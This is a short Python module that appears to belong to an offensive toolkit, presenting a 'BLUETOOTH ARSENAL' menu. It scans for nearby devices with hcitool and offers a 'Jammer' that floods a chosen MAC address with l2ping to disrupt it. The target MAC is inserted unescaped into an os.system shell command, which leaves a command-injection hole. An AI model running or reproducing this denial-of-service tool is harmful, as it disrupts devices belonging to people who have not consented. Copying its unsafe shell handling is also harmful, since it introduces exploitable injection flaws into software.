import subprocess, time, os
from core.ui import UI, C, W, R, G, B, NC, Y

class BluetoothAttack:
    def run(self):
        while True:
            UI.banner()
            UI.print_box(["SCAN: HCI Discovery", "ATTACK: L2PING Flood"], title="BLUETOOTH ARSENAL")
            
            print(f"\n {C}1.{NC} Start Scan")
            print(f" {C}2.{NC} Launch Jammer")
            print(f" {C}3.{NC} Return to Menu")
            
            c = input(f"\n {B}Select{NC} {C}»{NC} ")
            
            if c == '1':
                print(f"\n{C}[*] Scanning Environment...{NC}")
                try:
                    subprocess.run("hcitool scan", shell=True)
                    input(f"\n{W}Press Enter...{NC}")
                except: print(f"{R}[!] Hardware missing.{NC}"); time.sleep(2)
            elif c == '2':
                t = input(f"\n{W}Target MAC > {NC}")
                if t: os.system(f"xterm -e 'l2ping -i hci0 -f {t}'")
            elif c == '3': break
